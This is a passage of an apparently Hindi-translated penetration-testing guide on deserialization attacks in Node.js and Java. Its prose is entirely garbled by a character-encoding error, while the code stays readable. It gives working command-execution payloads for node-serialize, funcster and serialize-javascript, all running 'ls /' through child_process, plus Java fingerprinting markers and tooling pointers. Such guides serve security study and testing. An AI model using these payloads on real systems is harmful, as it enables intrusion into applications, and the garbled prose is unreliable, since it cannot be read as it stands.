рдпрд╣ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдлрд╝рдВрдХреНрд╢рди рдХреЛ serialize рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдЙрджрд╛рд╣рд░рдг:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
рдпрд╣ **рд╕рдВрдХрд▓рд┐рдд рдСрдмреНрдЬреЗрдХреНрдЯ** рдЗрд╕ рддрд░рд╣ рджрд┐рдЦреЗрдЧрд╛:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
рдЖрдк рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЬрдм рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ `_$$ND_FUNC$$_` рдлрд╝реНрд▓реИрдЧ рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред

`node-serialize/lib/serialize.js` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЖрдк рдЗрд╕реА рдлрд╝реНрд▓реИрдЧ рдФрд░ рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

![](<../../.gitbook/assets/image (297).png>)

![](<../../.gitbook/assets/image (298).png>)

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдЕрдВрддрд┐рдо рдХреЛрдб рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, **рдЕрдЧрд░ рдлрд╝реНрд▓реИрдЧ рдорд┐рд▓ рдЬрд╛рддрд╛ рд╣реИ** рддреЛ `eval` рдХрд╛ рдЙрдкрдпреЛрдЧ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдбреАрд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдореВрд▓ рд░реВрдк рд╕реЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ `eval` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдЕрдВрджрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, **рдХреЗрд╡рд▓ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рд╕реЗ рдЙрд╕реЗ рдирд╣реАрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛** рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХреЗ рд▓рд┐рдП рдХреЛрдб рдХреЗ рдХрд┐рд╕реА рд╣рд┐рд╕реНрд╕реЗ рдореЗрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ `y.rce` рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдП рдФрд░ рдпрд╣ рдмрд╣реБрдд **рдЕрд╕рдВрднрд╛рд╡реНрдп** рд╣реИред
рдлрд┐рд░ рднреА, рдЖрдк рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдСрдЯреЛ рдПрдХреНрд╕реАрдХреНрдпреВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдмреНрд░реИрдХреЗрдЯ рдЬреЛрдбрд╝рдХрд░ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
рдЕрдЧрд▓реЗ рдХреЛрдб рдЯреБрдХрдбрд╝реЗ рдореЗрдВ **рдЕрдВрддрд┐рдо рдмреНрд░реИрдХреЗрдЯ** рдХрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдФрд░ рдХреИрд╕реЗ `unserialize` рдлрд╝рдВрдХреНрд╢рди рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдХреЛрдб рдХреЛ рдПрдХреНрд╕реАрдХреНрдпреВрдЯ рдХрд░реЗрдЧрд╛:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
рдЬреИрд╕рд╛ рдХрд┐ рдкрд╣рд▓реЗ рдЗрдВрдЧрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдпрд╣ рдкреБрд╕реНрддрдХрд╛рд▓рдп `_$$ND_FUNC$$_` рдХреЗ рдмрд╛рдж рдХреЛрдб рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧреА рдФрд░ `eval` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ **рдЪрд▓рд╛рдПрдЧреА**ред рдЗрд╕рд▓рд┐рдП, рдХреЛрдб рдХреЛ **рдСрдЯреЛ-рдЪрд▓рд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдлрдВрдХреНрд╢рди рдирд┐рд░реНрдорд╛рдг** рднрд╛рдЧ рдФрд░ рдЕрдВрддрд┐рдо рдмреНрд░реИрдХреЗрдЯ рдХреЛ рд╣рдЯрд╛ рджреЗрдирд╛ рд╣реЛрдЧрд╛ рдФрд░ **рдХреЗрд╡рд▓ рдПрдХ JS рд╡рдирд▓рд╛рдЗрдирд░** рдХреЛ рдЪрд▓рд╛рдирд╛ рд╣реЛрдЧрд╛, рдЬреИрд╕рд╛ рдХрд┐ рдирд┐рдореНрди рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
рдЖрдк рдЗрд╕ рд╡рд┐рдХрд▓реНрдк рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕ рд╕рдВрдХрдЯ рдХреЛ рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ [**рдпрд╣рд╛рдВ**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

### [funcster](https://www.npmjs.com/package/funcster)

рдпрд╣рд╛рдВ рджрд┐рд▓рдЪрд╕реНрдк рдЕрдВрддрд░ рд╣реИ рдХрд┐ **рдорд╛рдирдХ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рд╡рд╕реНрддреБрдПрдВ рдЕрднрд┐рдЧрдореНрдп рдирд╣реАрдВ рд╣реИрдВ**, рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ рдмрд╛рд╣рд░реА рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рд╣реИрдВред рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рд╣рдо рдЕрдкрдиреЗ рдХреЛрдб рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдмрд┐рд▓реНрдЯ-рдЗрди рд╡рд╕реНрддреБрдУрдВ рдХреЗ рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рдирд╣реАрдВ рдмреБрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рд╣рдо `console.log()` рдпрд╛ `require(something)` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдиреЛрдб рдПрдХ рдЕрдкрд╡рд╛рдж рд▓реМрдЯрд╛рддрд╛ рд╣реИ рдЬреИрд╕реЗ `"ReferenceError: console is not defined"`ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╣рдо рдЖрд╕рд╛рдиреА рд╕реЗ рд╕рдм рдХреБрдЫ рддрдХ рдкрд╣реБрдВрдЪ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рд╣рдореЗрдВ рдЕрднреА рднреА рдЧреНрд▓реЛрдмрд▓ рд╕рдВрджрд░реНрдн рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЧреНрд▓реЛрдмрд▓ рд╕рдВрджрд░реНрдн рдХреЗ рдкрд╛рд╕ рдкрд╣реБрдВрдЪ рд╣реИ, рдЬреИрд╕реЗ `this.constructor.constructor("console.log(1111)")();`:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЗрд╕ рдкреЗрдЬ рдХреЛ рдкрдврд╝реЗрдВ**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**ред**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

**рдкреИрдХреЗрдЬ рдореЗрдВ рдХреЛрдИ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рд╣реИ рдФрд░ рдЖрдкрдХреЛ рдЗрд╕реЗ рдЦреБрдж рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЙрдирдХрд╛ рдЙрджрд╛рд╣рд░рдг рд╕реАрдзреЗ `eval` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдЙрджрд╛рд╣рд░рдг рд╣реИ:**
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
рдпрджрд┐ рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ **рдЖрд╕рд╛рдиреА рд╕реЗ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
### Cryo рдкреБрд╕реНрддрдХрд╛рд▓рдп

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрдареЛрдВ рдореЗрдВ рдЖрдкрдХреЛ рдЗрд╕ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдирд┐рдпрдорд┐рдд рдХрдорд╛рдВрдбреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓реЗрдЧреА:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## рдЬрд╛рд╡рд╛ - рдПрдЪрдЯреАрдЯреАрдкреА

рдЬрд╛рд╡рд╛ рдореЗрдВ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреА рдореБрдЦреНрдп рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ **рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЗ рджреМрд░рд╛рди рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЙрд▓рдмреИрдХ рдХреЛ рдЖрдордВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдЗрд╕рд╕реЗ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░** рдХреЛ **рдЙрд╕ рдХреЙрд▓рдмреИрдХ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ** рдФрд░ рдПрдХ рдкреЗрд▓реЛрдб рддреИрдпрд╛рд░ рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрддреА рд╣реИ рдЬреЛ рдХреЙрд▓рдмреИрдХ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рджреБрд╖реНрдХрд░реНрдореА рдХрд╛рд░реНрд░рд╡рд╛рдИ** рдХрд░рддреА рд╣реИред

### рдлрд┐рдВрдЧрд░рдкреНрд░рд┐рдВрдЯ

#### рд╡реНрд╣рд╛рдЗрдЯ рдмреЙрдХреНрд╕

рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХрдХреНрд╖рд╛рдУрдВ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдХреЛрдб рдореЗрдВ рдЦреЛрдЬреЗрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `Serializable` рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рд╡рд╛рд▓реА рдХрдХреНрд╖рд╛рдУрдВ, `java.io.ObjectInputStream` рдпрд╛ `readObject` рдпрд╛ `readUnshare` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЦреЛрдЬ рдХрд░реЗрдВред

рдЖрдкрдХреЛ рдЗрди рдкрд░ рднреА рдзреНрдпрд╛рди рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдП:

* рдмрд╛рд╣рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде `XMLdecoder`
* `XStream` рдХреЗ рд╕рд╛рде `fromXML` рдореЗрдердб (xstream рд╕рдВрд╕реНрдХрд░рдг <= v1.46 рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╕рдорд╕реНрдпрд╛ рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИ)
* `ObjectInputStream` рдХреЗ рд╕рд╛рде `readObject`
* `readObject`, `readObjectNodData`, `readResolve` рдпрд╛ `readExternal` рдХрд╛ рдЙрдкрдпреЛрдЧ
* `ObjectInputStream.readUnshared`
* `Serializable`

#### рдмреНрд▓реИрдХ рдмреЙрдХреНрд╕

**рдЬрд╛рд╡рд╛ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХреЗ** рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреА **рдлрд┐рдВрдЧрд░рдкреНрд░рд┐рдВрдЯ / рдореИрдЬрд┐рдХ рдмрд╛рдЗрдЯреНрд╕** (рд╡рд┐рдЬреНрдЮрд╛рдкрди `ObjectInputStream` рд╕реЗ):

* `AC ED 00 05` рд╣реЗрдХреНрд╕ рдореЗрдВ
* `rO0` рдмреЗрд╕64 рдореЗрдВ
* `Content-type` рд╣реИрдбрд░ рдПрдХ рдПрдЪрдЯреАрдЯреАрдкреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ `application/x-java-serialized-object` рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ
* `1F 8B 08 00` рд╣реЗрдХреНрд╕ рдкрд╣рд▓реЗ рд╕рдВрдкреАрдбрд╝рд┐рдд
* `H4sIA` рдмреЗрд╕64 рдкрд╣рд▓реЗ рд╕рдВрдкреАрдбрд╝рд┐рдд
* рд╡реЗрдм рдлрд╝рд╛рдЗрд▓реЗрдВ рдЬрд┐рдирдореЗрдВ рдПрдХреНрд╕рдЯреЗрдВрд╢рди `.faces` рдФрд░ `faces.ViewState` рдкреИрд░рд╛рдореАрдЯрд░ рд╣реИред рдпрджрд┐ рдЖрдкрдХреЛ рд╡реЗрдмрдРрдк рдореЗрдВ рдпрд╣ рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ [**рдЬрд╛рд╡рд╛ JSF VewState рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди**](java-jsf-viewstate-.faces-deserialization.md) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкреЛрд╕реНрдЯ рдХреЛ рджреЗрдЦреЗрдВред
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### рдпрджрд┐ рдЖрдк рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЬрд╛рд╡рд╛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдЕрдкрд╢рд┐рд╖реНрдЯ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ [**рдмреЗрд╕рд┐рдХ рдЬрд╛рд╡рд╛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди**](basic-java-deserialization-objectinputstream-readobject.md), [**рдЬрд╛рд╡рд╛ DNS рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди**](java-dns-deserialization-and-gadgetprobe.md) рдФрд░ [**рдХреЙрдордиреНрд╕ рдХрд▓реЗрдХреНрд╢рди 1 рдкреЗрд▓реЛрдб**](java-transformers-to-rutime-exec-payload.md) рдкрд░ рдирдЬрд╝рд░ рдбрд╛рд▓рдиреА рдЪрд╛рд╣рд┐рдПред

#### рд╡реНрд╣рд╛рдЗрдЯ рдмреЙрдХреНрд╕ рдЯреЗрд╕реНрдЯ

рдЖрдк рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдРрд╕рд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдерд╛рдкрд┐рдд рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЬреНрдЮрд╛рдд рдЕрдкрд╢рд┐рд╖реНрдЯрддрд╛рдПрдВ рд╣реИрдВред
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
рдЖрдк рдЙрди рд╕рднреА рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЬреНрдЮрд╛рдд рд░реВрдк рд╕реЗ рдЦреБрд▓рд╛рд╕рд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЬрд┐рдирдХреЗ рд▓рд┐рдП [**Ysoserial**](https://github.com/frohoff/ysoserial) рдПрдХ рдЙрддреНрдкрд╛рджрди рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╛ рдЖрдк [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json) рдкрд░ рджрд┐рдП рдЧрдП рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
рдЖрдк [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рд╕рдВрднрд╛рд╡рд┐рдд рдЧреИрдЬреЗрдЯ рд╢реНрд░реГрдВрдЦрд▓рд╛рдУрдВ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХреЗрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
**gadgetinspector** рдХреЛ рдЪрд▓рд╛рддреЗ рд╕рдордп (рдЗрд╕реЗ рдмрд┐рд▓реНрдб рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж) рдЙрд╕реЗ рдЬрд╛ рд░рд╣реЗ рдмрд╣реБрдд рд╕рд╛рд░реЗ рдЪреЗрддрд╛рд╡рдирд┐рдпреЛрдВ / рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреА рдкрд░рд╡рд╛рд╣ рди рдХрд░реЗрдВ рдФрд░ рдЙрд╕реЗ рдкреВрд░рд╛ рд╣реЛрдиреЗ рджреЗрдВред рдпрд╣ рд╕рднреА рдЦреЛрдЬреЛрдВ рдХреЛ _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_ рдХреЗ рддрд╣рдд рд▓рд┐рдЦреЗрдЧрд╛ред рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **gadgetinspector рдПрдХ рдЙрддреНрдкрд╛рджрди рдирд╣реАрдВ рдмрдирд╛рдПрдЧрд╛ рдФрд░ рдпрд╣ рдЧрд▓рдд рд╕рдХрд╛рд░рд╛рддреНрдордХ рдирддреАрдЬреЗ рджрд┐рдЦрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

#### рдмреНрд▓реИрдХ рдмреЙрдХреНрд╕ рдкрд░реАрдХреНрд╖рдг

рдмрд░реНрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕реА рдкреБрд╕реНрддрдХрд╛рд▓рдпреЗрдВ рдЙрдкрд▓рдмреНрдз рд╣реИрдВ** (рдФрд░ рдЙрдирдХреЗ рд╕рдВрд╕реНрдХрд░рдг рднреА)ред рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде, рдпрд╣ рдЖрд╕рд╛рди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдк рдПрдХ рдкреЗрд▓реЛрдб рдЪреБрдиреЗрдВ рдЬрд┐рд╕рд╕реЗ рд╕рдВрдХреНрд░рдордг рдХреА рдХрдордЬреЛрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдВред
[**рдЧреИрдЬреЗрдЯрдкреНрд░реЛрдм рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдиреЗрдВ**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**ред**
GadgetProbe **`ObjectInputStream`** рд╕рдВрдХреНрд░рдордгреЛрдВ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рд╣реИред

рдмрд░реНрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк ysoserial рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
[**рдЬрд╛рд╡рд╛ рд╕рдВрдХреНрд░рдордг рд╕реНрдХреИрдирд░ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдиреЗрдВред**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)
рдЬрд╛рд╡рд╛ рд╕рдВрдХреНрд░рдордг рд╕реНрдХреИрдирд░ **`ObjectInputStream`** рд╕рдВрдХреНрд░рдордгреЛрдВ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рд╣реИред

рдЖрдк рдмрд░реНрдк рдореЗрдВ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреА рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП [**Freddy**](https://github.com/nccgroup/freddy) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдкреНрд▓рдЧрдЗрди **`ObjectInputStream`** рд╕рдВрдмрдВрдзрд┐рдд рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде-рд╕рд╛рде **Json** рдФрд░ **Yml** рд╕рдВрдХреНрд░рдордг рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЗ vulns рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдЧрд╛ред рд╕рдХреНрд░рд┐рдп рдореЛрдб рдореЗрдВ, рдпрд╣ рдиреАрдВрдж рдпрд╛ DNS рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдиреНрд╣реЗрдВ рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛ред
[**рдЖрдк Freddy рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**рд╕рдВрдХреНрд░рдордг рдкрд░реАрдХреНрд╖рдг**

